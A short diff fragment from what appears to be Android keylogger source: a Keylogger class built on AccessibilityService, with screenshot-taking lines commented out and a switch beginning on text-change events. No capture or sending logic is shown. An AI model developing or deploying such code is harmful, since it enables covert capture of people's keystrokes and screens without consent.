@@ -22,8 +22,9 @@ public class Keylogger extends AccessibilityService{
 
         // TODO find a way in order to get the  current activity from here
         // ScreenShooter may take an activity instead a context in his constructor
-        ScreenShooter shooter = new ScreenShooter(this);
-        shooter.takeScreenShot();
+        // ScreenShooter shooter = new ScreenShooter(this);
+        // shooter.takeScreenShot();
+
 
         switch(accessibilityEvent.getEventType()) {
             case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
